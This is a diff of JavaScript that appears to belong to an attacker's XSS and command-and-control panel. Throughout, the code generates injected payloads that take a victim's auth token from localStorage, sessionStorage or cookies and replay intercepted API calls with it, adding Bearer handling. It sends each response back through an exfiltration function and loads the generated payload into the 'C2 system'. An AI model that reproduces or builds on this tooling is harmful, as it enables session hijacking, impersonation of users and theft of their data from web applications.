@@ -1,6 +1,7 @@
 let selectedClientId = "";
 let tokenUrl         = "";
 let tokenLocation    = "";
+let tokenKey         = "";
 
 
 function escapeHTML(string) 
@@ -1157,11 +1158,13 @@ async function searchAuthToken(eventKey, tokenValue, apiType)
 	else
 	{
 		searchData.innerHTML  = '<b>Auth Token Location:</b><br>' + tokenSearchJson.location + '<br><br>';
+		searchData.innerHTML += '<b>Token Key:</b><br>' + tokenSearchJson.tokenName + '<br><br>';
 		searchData.innerHTML += '<b>Click "Next" to build payload</b>';		
 	}
 
 
 	tokenLocation = tokenSearchJson.location;
+	tokenKey      = tokenSearchJson.tokenName;
 	searchDataDiv.appendChild(searchData);
 }
 
@@ -1181,6 +1184,8 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 	tokenName.value  = "";
 	tokenValue.value = "";
 
+	var tokenSearch = false;
+
 	var apiCallData = JSON.parse(apiCallDataString);
 
 	console.log(apiCallData);
@@ -1196,7 +1201,6 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 		apiAsync = escapeHTML(apiCallData.asyncRequest);
 		name     = escapeHTML(apiCallData.name);
 		passwrod = escapeHTML(apiCallData.password);
-
 	}
 
 	var apiDataDiv    = document.getElementById('apiDataDiv');
@@ -1279,6 +1283,7 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 		if (canSearch)
 		{
 			searchAuthToken(eventKey, tokenValue.value.trim(), apiType)
+			tokenSearch = true;
 		}
 
 		searchButton.blur();
@@ -1314,24 +1319,28 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 		{
 			case 'Local Storage':
 			{
-				payload += `var foundAuthToken = localStorage.getItem('${tokenName.value.trim()}');\n`;
+				payload += `var foundAuthToken = localStorage.getItem('${tokenKey}');\n`;
 			}
 			break;
 
 			case 'Session Storage':
 			{
-				payload += `var foundAuthToken = sessionStorage.getItem('${tokenName.value.trim()}');\n`;
+				payload += `var foundAuthToken = sessionStorage.getItem('${tokenKey}');\n`;
 			}
 			break;
 
 			case 'Cookies':
 			{
-				payload += `var foundAuthToken = getCookie('${tokenName.value.trim()}');\n`;
+				payload += `var foundAuthToken = getCookie('${tokenKey}');\n`;
 			}
 			break;
 
 		default:
-			alert('Authentication token not found.');
+			if (tokenSearch)
+			{
+				// Only matters if we're trying to search for a token
+				alert('Authentication token not found.');
+			}
 		}
 
 
@@ -1360,7 +1369,7 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 		    {
 		        var headerInfo = apiCallData.headers[key]; // Assuming this is already an object with 'header' and 'value'
 
-		        var headerName = headerInfo.header;
+		        var headerName  = headerInfo.header;
 		        var headerValue = headerInfo.value;
 
 		        console.log('$$$$$ Header Info: ', headerInfo);
@@ -1371,7 +1380,17 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 		        {
 		            // this is our dynamic token
 		            console.log('&& found auth header!');
-		            payload += `        '${headerName}': foundAuthToken,\n`;
+
+		            // Need to check if it uses the Bearer format
+		            if (headerValue.includes('Bearer'))
+		            {
+		            	payload += `        '${headerName}': 'Bearer ' + foundAuthToken,\n`;
+
+		            }
+		            else
+		            {		          
+		            	payload += `        '${headerName}': foundAuthToken,\n`;
+		            }
 		        } 
 		        else 
 		        {
@@ -1386,7 +1405,7 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 
 		payload += "})\n";
 		payload += ".then(response => {\n";
-		payload += "	var statusCode   = response.status;\n";
+		payload += "	var statusCode = response.status;\n";
 		payload += "	return response.text().then(responseBody => {\n";
 		payload += "		customExfil('Payload Response, Status code: ' + statusCode, 'Response Body:' + responseBody);\n";
 		payload += "	});\n";
@@ -1399,11 +1418,20 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 		nextButton.blur();
 		console.log("Payload dump:");
 		console.log(payload);
+ 
 
+    	// Ok, now we need to push this into the C2 system
+		var payloadNameInput   = document.getElementById('payloadName');
+		var payloadDescription = document.getElementById('payloadDescription');
+		var payloadCode        = document.getElementById('payload-editor');
+
+		payloadNameInput.value   = "Mimic API payload";
+		payloadDescription.value = "Automatically generated custom payload from intercepted API network calls.";
+		payloadCode.value        = payload;
+
+		modal.hide();
+		showCustomPayloadModal(true);
 	}
-
-
-
 
 	// Pop that sucker open
 	var modal = new bootstrap.Modal(document.getElementById('createApiMimicModal'));
@@ -1649,7 +1677,7 @@ async function showMimicFormModal(eventKey, formDataString)
 		var payloadDescription = document.getElementById('payloadDescription');
 		var payloadCode        = document.getElementById('payload-editor');
 
-		payloadNameInput.value   = "Autogen mimic payload";
+		payloadNameInput.value   = "Mimic Form submission payload";
 		payloadDescription.value = "Automatically generated custom payload from form submission.";
 		payloadCode.value        = payload;
 
